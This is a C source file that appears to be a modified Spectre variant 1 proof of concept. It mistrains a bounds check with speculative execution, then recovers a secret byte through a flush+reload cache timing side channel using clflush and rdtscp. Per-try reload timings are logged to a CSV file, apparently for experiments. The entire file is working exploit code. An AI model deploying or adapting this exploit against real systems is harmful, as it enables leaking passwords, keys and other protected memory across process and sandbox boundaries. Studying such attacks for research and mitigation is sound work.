#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */

#pragma optimize("gt",on)

#else
#include <x86intrin.h> /* for rdtscp and clflush */

#endif

#define N_TRIES 20
#define N_VICTIM 159
#define N_TRAINING 16

#define FLUSHRELOAD_STEP 64
#define FLUSHRELOAD_STEP_NBITS 6

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
/*
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1,
  1
  */
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * FLUSHRELOAD_STEP];
//uint64_t reload_time[N_TRIES*256];
uint64_t reload_time[N_TRIES*256];

//char * secret = "The Magic Words are Squeamish Ossifrage.";
uint8_t secret[10];

uint8_t temp = 10; //Used so compiler won’t optimize out victim_function()

void victim_function(size_t x) {
//  printf("enter victim\n");
  if (x < array1_size) {
//    printf("before victim access\n");
    temp &= array2[array1[x] << FLUSHRELOAD_STEP_NBITS];
//    printf("after victim access\n");
  }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD 80 /* assume cache hit if time <= threshold */

static __inline__ uint64_t gy_rdtscp(void)
{
  uint32_t lo, hi;
  //__asm__ __volatile__ (
  //asm volatile (
  //      "xorl %%eax,%%eax \n        cpuid"
  //      ::: "%rax", "%rbx", "%rcx", "%rdx");
  //__asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
  __asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
  return (uint64_t)hi << 32 | lo;
}

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2],
                    int score[2], int results[256]) {
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;
  uint64_t reload_time_temp[256];
  uint8_t *preload_array2;
  int preload_flushreload_step;

  for (i = 0; i < 256; i++)
    results[i] = 0;


  for (tries = N_TRIES; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      /* intrinsic for clflush instruction */
      _mm_clflush( & array2[i << FLUSHRELOAD_STEP_NBITS]);

    /* 30 loops: 5 training runs (x=training_x)
                 per attack run (x=malicious_x)*/
    training_x = tries % array1_size;

    // Load the secret into cache for fast access
    preload_array2 = array2;
    results[256] ^= (int)secret[0];

    for (j = N_VICTIM; j >= 0; j--) {
      _mm_clflush( & array1_size);
      // Delay (can also mfence)
      for (volatile int z = 0; z < 100; z++) {}

      // Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0
      // Avoid jumps in case those tip off the branch predictor
      // Set x=FFF.FF0000 if j%6==0, else x=0
      x = ((j % N_TRAINING) - 1) & ~0xFFFF;
      // Set x=-1 if j&6=0, else x=0
      x = (x | (x >> 16));
      x = training_x ^ (x & (malicious_x ^ training_x));

      // Call the victim!
      victim_function(x);

    }

    preload_array2 = array2;
    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i << FLUSHRELOAD_STEP_NBITS];
      time1 = __rdtscp( & junk); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      //junk = array2[mix_i * FLUSHRELOAD_STEP]; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp( & junk) - time1; // READ TIMER & COMPUTE ELAPSED TIME
      reload_time_temp[mix_i]=time2;
    }

    for (i = 0; i < 256; i++) {
      if (reload_time_temp[i] <= CACHE_HIT_THRESHOLD &&
          i != array1[tries % array1_size])
        results[i]++; /* cache hit - add +1 to score for this value */
      reload_time[(N_TRIES-tries)*256+i]=reload_time_temp[i];
    }

    if (tries % 64 == 0) {
        printf("#tries: %d\n", tries);
        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++) {
          if (j < 0 || results[i] >= results[j]) {
            k = j;
            j = i;
          } else if (k < 0 || results[i] >= results[k]) {
            k = i;
          }
        }
        value[0] = (uint8_t) j;
        score[0] = results[j];
        value[1] = (uint8_t) k;
        score[1] = results[k];
        printf("%d %d %d %d %d\n", tries, value[0], score[0], value[1], score[1]);
    }
  }
  results[256] ^= junk;
}

int main(int argc,
  const char * * argv) {
  /* default for malicious_x */
  secret[0] = SECRET;
  size_t malicious_x = (size_t)(secret - array1);
  int i, j, score[2], len = 1;
  uint8_t value[2];
  static int results[256+1];

  //for (i = 0; i < sizeof(array2); i++)
  //  array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  //if (argc == 3) {
  //  sscanf(argv[1], "%p", (void * * )( & malicious_x));
  //  malicious_x -= (size_t) array1; /* Convert input value into a pointer */
  //  sscanf(argv[2], "%d", & len);
  //}

  char * fname;
  fname = (char *) malloc(100);
  //sprintf(fname, "%s%s", argv[1], "_result.csv");
  //FILE* resfile = fopen(fname, "w");
  sprintf(fname, "%s%s", argv[1], "_time.csv");
  FILE* timefile = fopen(fname, "w");

  //printf("Reading %d bytes:\n", len);
  printf("array2 addr: %p\n", array2);
  while (--len >= 0) {
    //printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
    readMemoryByte(malicious_x++, value, score, results);

  //  for (i = 0; i < 256; i++)
  //    fprintf(resfile, "%d ", results[i]);
    for (i = 0; i < N_TRIES; i++) {
      for (j = 0; j < 256; j++)
        fprintf(timefile, "%" PRIu64 " ", reload_time[i*256+j]);
      fprintf(timefile, "\n");
    }

    printf("%s: ", (score[0] > 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=%c score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
  }

  printf("temp: %d\n", temp);

  //fclose(resfile);
  fclose(timefile);

  return (0);
}

